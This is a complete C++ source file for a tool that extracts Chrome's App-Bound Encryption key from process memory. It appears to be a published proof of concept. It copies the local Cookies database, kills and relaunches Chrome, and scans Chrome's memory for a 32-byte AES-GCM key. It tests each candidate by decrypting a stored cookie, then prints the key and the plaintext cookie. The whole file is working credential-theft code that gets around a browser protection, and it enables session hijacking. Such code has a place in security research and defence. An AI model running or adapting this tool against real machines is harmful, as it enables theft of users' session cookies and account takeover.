/**
 * ABE KEY EXTRACTOR
 *
 * Build: cl /EHsc /O2 abe_key_extractor.cpp sqlite3.c bcrypt.lib user32.lib shell32.lib
 *
 * Works on x64 and ARM64 Windows
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <shellapi.h>
#include <stdio.h>
#include <vector>
#include <thread>
#include <atomic>
#include <string>

#include "sqlite3.h"

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

// Configuration - Change these for different Chrome versions

static const wchar_t* CHROME_EXE_PATH       = L"\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --no-first-run https://www.google.com";
static const char*    CHROME_COOKIES_PATH   = "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
// static const char*    CHROME_COOKIES_PATH   = "\\Google\\Chrome Beta\\User Data\\Default\\Network\\Cookies";
// static const wchar_t* CHROME_EXE_PATH       = L"\"C:\\Program Files\\Google\\Chrome Beta\\Application\\chrome.exe\" --no-first-run https://www.google.com";
static const wchar_t* CHROME_PROCESS_NAME   = L"chrome.exe";

static const int      MAX_ATTEMPTS          = 30;
static const int      SCAN_TIMEOUT_MS       = 3000;
static const int      MAX_REGION_SIZE       = 4 * 1024 * 1024;

// Global State

std::vector<BYTE> g_encryptedCookie;
std::string g_cookieHost;
std::string g_cookieName;
std::string g_cookiePath;
bool g_cookieSecure = false;
bool g_cookieHttpOnly = false;
long long g_cookieExpires = 0;

std::atomic<bool> g_found{false};
std::atomic<bool> g_running{true};
std::atomic<int> g_scanned{0};
std::atomic<int> g_candidates{0};

BYTE g_foundKey[32] = {0};
ULONGLONG g_foundAddr = 0;
DWORD g_foundPid = 0;
DWORD g_targetPid = 0;
BCRYPT_ALG_HANDLE g_hAlg = NULL;
std::vector<BYTE> g_decryptedCookie;

std::vector<DWORD> GetChromePids();
void KillAllChrome();

// Cookie Extraction

bool ExtractLocalCookie() {
    char localAppData[MAX_PATH];
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        printf("  [-] Cannot get LocalAppData path\n");
        return false;
    }

    std::string cookiesPath = std::string(localAppData) + CHROME_COOKIES_PATH;

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string tempCookies = std::string(tempPath) + "abe_cookies_temp.db";

    // Always delete temp file first to ensure fresh copy
    DeleteFileA(tempCookies.c_str());

    if (!CopyFileA(cookiesPath.c_str(), tempCookies.c_str(), FALSE)) {
        DWORD err = GetLastError();
        if (err == 32) {  // ERROR_SHARING_VIOLATION
            KillAllChrome();
            Sleep(500);
            if (!CopyFileA(cookiesPath.c_str(), tempCookies.c_str(), FALSE)) {
                printf("  [-] Cannot copy Cookies database (error %lu)\n", GetLastError());
                return false;
            }
        } else {
            printf("  [-] Cannot copy Cookies database (error %lu)\n", err);
            return false;
        }
    }

    // Open database
    sqlite3* db = nullptr;
    int rc = sqlite3_open_v2(tempCookies.c_str(), &db, SQLITE_OPEN_READONLY, nullptr);
    if (rc != SQLITE_OK) {
        printf("  [-] Cannot open database: %s\n", sqlite3_errmsg(db));
        if (db) sqlite3_close(db);
        DeleteFileA(tempCookies.c_str());
        return false;
    }

    // Query for v20-encrypted cookie
    sqlite3_stmt* stmt = nullptr;
    const char* query = "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value "
                        "FROM cookies WHERE encrypted_value LIKE 'v20%' LIMIT 1";

    rc = sqlite3_prepare_v2(db, query, -1, &stmt, nullptr);
    if (rc != SQLITE_OK) {
        printf("  [-] Query failed: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        DeleteFileA(tempCookies.c_str());
        return false;
    }

    bool found = false;
    if (sqlite3_step(stmt) == SQLITE_ROW) {
        const char* host = (const char*)sqlite3_column_text(stmt, 0);
        const char* name = (const char*)sqlite3_column_text(stmt, 1);
        const char* path = (const char*)sqlite3_column_text(stmt, 2);
        int isSecure = sqlite3_column_int(stmt, 3);
        int isHttpOnly = sqlite3_column_int(stmt, 4);
        sqlite3_int64 expires = sqlite3_column_int64(stmt, 5);
        const void* blob = sqlite3_column_blob(stmt, 6);
        int blobLen = sqlite3_column_bytes(stmt, 6);

        if (blob && blobLen > 31) {
            g_encryptedCookie.assign((BYTE*)blob, (BYTE*)blob + blobLen);
            g_cookieHost = host ? host : "";
            g_cookieName = name ? name : "";
            g_cookiePath = path ? path : "";
            g_cookieSecure = isSecure != 0;
            g_cookieHttpOnly = isHttpOnly != 0;
            g_cookieExpires = expires;
            printf("  [+] Extracted cookie: %s (%d bytes)\n", g_cookieName.c_str(), blobLen);
            found = true;
        }
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(tempCookies.c_str());

    if (!found) {
        printf("  [-] No v20-encrypted cookies found\n");
    }
    return found;
}

// Key Candidate Detection

inline bool LooksLikeKey(const BYTE* data) {
    bool seen[256] = {false};
    int unique = 0;
    for (int i = 0; i < 32; i++) {
        if (!seen[data[i]]) { seen[data[i]] = true; unique++; }
    }
    if (unique < 20) return false;

    int zeros = 0, ffs = 0;
    for (int i = 0; i < 32; i++) {
        if (data[i] == 0x00) zeros++;
        if (data[i] == 0xFF) ffs++;
    }
    return (zeros <= 4 && ffs <= 4);
}

// Decryption Validation

bool TryDecrypt(const BYTE* key) {
    if (g_encryptedCookie.size() < 32) return false;

    BCRYPT_KEY_HANDLE hKey = NULL;
    if (BCryptGenerateSymmetricKey(g_hAlg, &hKey, NULL, 0, (PBYTE)key, 32, 0) != 0)
        return false;

    const BYTE* cookie = g_encryptedCookie.data();
    size_t cookieLen = g_encryptedCookie.size();

    // v20 format: header(3) + nonce(12) + ciphertext(variable) + tag(16)
    const BYTE* nonce = cookie + 3;
    const BYTE* tag = cookie + cookieLen - 16;
    const BYTE* ciphertext = nonce + 12;
    ULONG ciphertextLen = (ULONG)(cookieLen - 3 - 12 - 16);

    if (ciphertextLen == 0 || ciphertextLen > 10000) {
        BCryptDestroyKey(hKey);
        return false;
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PBYTE)nonce;
    authInfo.cbNonce = 12;
    authInfo.pbTag = (PBYTE)tag;
    authInfo.cbTag = 16;

    std::vector<BYTE> plaintext(ciphertextLen + 32);
    DWORD outLen = 0;
    NTSTATUS status = BCryptDecrypt(hKey, (PBYTE)ciphertext, ciphertextLen, &authInfo,
                                     NULL, 0, plaintext.data(), (ULONG)plaintext.size(), &outLen, 0);
    BCryptDestroyKey(hKey);

    if (status == 0) {
        g_decryptedCookie.assign(plaintext.begin(), plaintext.begin() + outLen);
        return true;
    }
    return false;
}

// Process Management

std::vector<DWORD> GetChromePids() {
    std::vector<DWORD> pids;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe = {sizeof(pe)};
        if (Process32FirstW(snap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, CHROME_PROCESS_NAME) == 0)
                    pids.push_back(pe.th32ProcessID);
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
    }
    return pids;
}

void KillAllChrome() {
    auto pids = GetChromePids();
    for (DWORD pid : pids) {
        HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (h) { TerminateProcess(h, 0); CloseHandle(h); }
    }
    for (int i = 0; i < 30 && !GetChromePids().empty(); i++) Sleep(100);
}

// Memory Scanning

bool ScanProcess(DWORD pid) {
    HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) return false;

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID addr = si.lpMinimumApplicationAddress;
    std::vector<BYTE> buf;

    while (addr < si.lpMaximumApplicationAddress && g_running && !g_found) {
        if (VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi)) == 0) {
            addr = (LPBYTE)addr + 0x1000;
            continue;
        }

        if (mbi.State == MEM_COMMIT &&
            mbi.Protect == PAGE_READWRITE &&
            mbi.RegionSize <= MAX_REGION_SIZE) {

            buf.resize(mbi.RegionSize);
            SIZE_T bytesRead;

            if (ReadProcessMemory(hProc, mbi.BaseAddress, buf.data(), mbi.RegionSize, &bytesRead)) {
                for (SIZE_T i = 0; i + 32 <= bytesRead && g_running && !g_found; i += 8) {
                    g_scanned++;
                    if (!LooksLikeKey(buf.data() + i)) continue;
                    g_candidates++;

                    if (TryDecrypt(buf.data() + i)) {
                        memcpy(g_foundKey, buf.data() + i, 32);
                        g_foundAddr = (ULONGLONG)mbi.BaseAddress + i;
                        g_foundPid = pid;
                        CloseHandle(hProc);
                        return true;
                    }
                }
            }
        }
        addr = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
    }

    CloseHandle(hProc);
    return false;
}

void ScannerThread() {
    while (g_running && !g_found) {
        if (g_targetPid != 0) {
            if (ScanProcess(g_targetPid)) {
                g_found = true;
                return;
            }
        }

        auto pids = GetChromePids();
        for (DWORD pid : pids) {
            if (!g_running || g_found) break;
            if (pid == g_targetPid) continue;
            if (ScanProcess(pid)) {
                g_found = true;
                return;
            }
        }
    }
}

// Extraction Attempt

bool RunAttempt(int attemptNum) {
    g_found = false;
    g_running = true;
    g_scanned = 0;
    g_candidates = 0;
    g_targetPid = 0;

    printf("  [%d] Kill Chrome...", attemptNum);
    KillAllChrome();

    printf(" Launch...");

    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    wchar_t cmdLine[512];
    wcscpy_s(cmdLine, CHROME_EXE_PATH);

    if (!CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf(" FAILED\n");
        return false;
    }

    g_targetPid = pi.dwProcessId;
    DWORD launchTime = GetTickCount();
    printf(" PID %lu\n", g_targetPid);

    std::thread scanner(ScannerThread);

    while (!g_found && (GetTickCount() - launchTime) < SCAN_TIMEOUT_MS) {
        printf("\r  [%d] T+%4lums | Scanned: %d | Candidates: %d      ",
               attemptNum, GetTickCount() - launchTime, g_scanned.load(), g_candidates.load());
        fflush(stdout);
        Sleep(50);
    }

    g_running = false;
    scanner.join();

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    if (!g_found) printf("\n");
    return g_found;
}

// Main

int main() {
    SetConsoleOutputCP(CP_UTF8);

    printf("\n");
    printf("  Chrome App-Bound Encryption Key Extraction via Memory Analysis\n");
    printf("  by Alexander Hagenah (@xaitax)\n");
    printf("  ───────────────────────────────────────────────────────────────\n\n");

    printf("  [*] Step 1: Extract encrypted cookie from local Chrome...\n");
    if (!ExtractLocalCookie()) {
        printf("  [-] Failed. Make sure Chrome has some cookies stored.\n");
        return 1;
    }
    printf("\n");

    BCryptOpenAlgorithmProvider(&g_hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(g_hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM,
                      sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

    DWORD totalStart = GetTickCount();

    printf("  [*] Step 2: Extract ABE key from Chrome memory (up to %d attempts)...\n\n", MAX_ATTEMPTS);

    for (int attempt = 1; attempt <= MAX_ATTEMPTS && !g_found; attempt++) {
        if (RunAttempt(attempt)) break;
    }

    BCryptCloseAlgorithmProvider(g_hAlg, 0);

    printf("\n\n");

    if (g_found) {
        DWORD elapsed = GetTickCount() - totalStart;

        printf("  ┌────────────────────────────────────────────────────────────────────┐\n");
        printf("  │                            KEY FOUND!                              │\n");
        printf("  ├────────────────────────────────────────────────────────────────────┤\n");
        printf("  │  Time:      %lu ms%-*s│\n", elapsed, 53 - (int)std::to_string(elapsed).length(), "");
        printf("  │  PID:       %-56lu│\n", g_foundPid);
        printf("  │  Address:   0x%-54llX│\n", g_foundAddr);
        printf("  ├────────────────────────────────────────────────────────────────────┤\n");
        printf("  │  AES-256 Key:                                                      │\n");
        printf("  │  ");
        for (int i = 0; i < 32; i++) printf("%02X", g_foundKey[i]);
        printf("  │\n");
        printf("  └────────────────────────────────────────────────────────────────────┘\n");

        // Find printable ASCII start (skip binary prefix)
        size_t asciiStart = 0;
        for (size_t i = 0; i < g_decryptedCookie.size(); i++) {
            char c = (char)g_decryptedCookie[i];
            if (c >= 32 && c < 127) {
                bool run = true;
                for (size_t j = i; j < i + 4 && j < g_decryptedCookie.size(); j++) {
                    if (g_decryptedCookie[j] < 32 || g_decryptedCookie[j] >= 127) { run = false; break; }
                }
                if (run) { asciiStart = i; break; }
            }
        }

        std::string cookieValue = "";
        if (asciiStart < g_decryptedCookie.size()) {
            cookieValue = std::string((char*)g_decryptedCookie.data() + asciiStart,
                                       g_decryptedCookie.size() - asciiStart);
        }

        printf("\n  Decrypted cookie:\n");
        printf("  ├─ host:       %s\n", g_cookieHost.c_str());
        printf("  ├─ name:       %s\n", g_cookieName.c_str());
        printf("  ├─ path:       %s\n", g_cookiePath.c_str());
        printf("  ├─ secure:     %s\n", g_cookieSecure ? "true" : "false");
        printf("  ├─ httponly:   %s\n", g_cookieHttpOnly ? "true" : "false");
        printf("  ├─ expires:    %lld\n", g_cookieExpires);
        printf("  └─ value:      %s\n\n", cookieValue.c_str());
        return 0;
    } else {
        printf("  ┌────────────────────────────────────────────────────────────────────┐\n");
        printf("  │                        KEY NOT FOUND                             │\n");
        printf("  │                 Failed after %d attempts                         │\n", MAX_ATTEMPTS);
        printf("  └────────────────────────────────────────────────────────────────────┘\n\n");
        return 1;
    }
}
